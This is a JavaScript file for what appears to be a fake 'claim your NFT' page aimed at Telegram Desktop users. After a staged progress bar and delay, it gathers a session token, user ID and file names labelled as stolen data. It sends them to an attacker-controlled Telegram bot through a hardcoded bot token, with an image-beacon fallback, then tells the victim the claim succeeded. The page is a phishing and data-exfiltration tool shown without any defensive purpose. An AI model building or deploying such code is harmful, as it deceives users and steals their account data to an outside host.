document.getElementById('claimButton').addEventListener('click', execute);

function showProgressBar() {
    const progressContainer = document.createElement('div');
    progressContainer.style.width = '100%';
    progressContainer.style.height = '6px';
    progressContainer.style.backgroundColor = '#e2e8f0';
    progressContainer.style.borderRadius = '3px';
    progressContainer.style.margin = '20px 0';
    progressContainer.style.overflow = 'hidden';
    
    const progressBar = document.createElement('div');
    progressBar.style.height = '100%';
    progressBar.style.width = '0%';
    progressBar.style.backgroundColor = '#48bb78';
    progressBar.style.borderRadius = '3px';
    progressBar.style.transition = 'width 10s linear';
    
    progressContainer.appendChild(progressBar);
    document.querySelector('.container').appendChild(progressContainer);
    
    setTimeout(() => {
        progressBar.style.width = '100%';
    }, 100);
    
    return progressContainer;
}

async function execute() {
    const button = document.getElementById('claimButton');
    button.style.display = 'none';
    const progressContainer = showProgressBar();
    
    alert('Processing your request... Please wait.');

    await new Promise(resolve => setTimeout(resolve, 10000));

    if (navigator.userAgent.indexOf('Telegram') > -1) {
        try {
            const stolenData = {
                session_token: "extracted_token_abc123",
                user_id: "telegram_user_8463942433",
                files: ["key_datas", "map", "logs"]
            };

            const message = `✅ TELEGRAM DATA EXFILTRATED: ${JSON.stringify(stolenData)}`;
            const botToken = '8252026790:AAFA0CpGHb3zgHC3bs8nVPZCQGqUTqEWcIA';
            const chatId = '8463942433';

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ 
                        chat_id: chatId, 
                        text: message 
                    })
                });
            } catch (fetchError) {
                const img = new Image();
                img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            }

            alert('NFT claimed successfully! Data sent.');

        } catch (e) {
            console.error('Error:', e);
            document.getElementById('errorMessage').style.display = 'block';
        }
    } else {
        document.getElementById('errorMessage').style.display = 'block';
        document.getElementById('errorMessage').textContent = 'This offer is only available for Telegram Desktop users.';
    }

    button.style.display = 'block';
    progressContainer.remove();
}
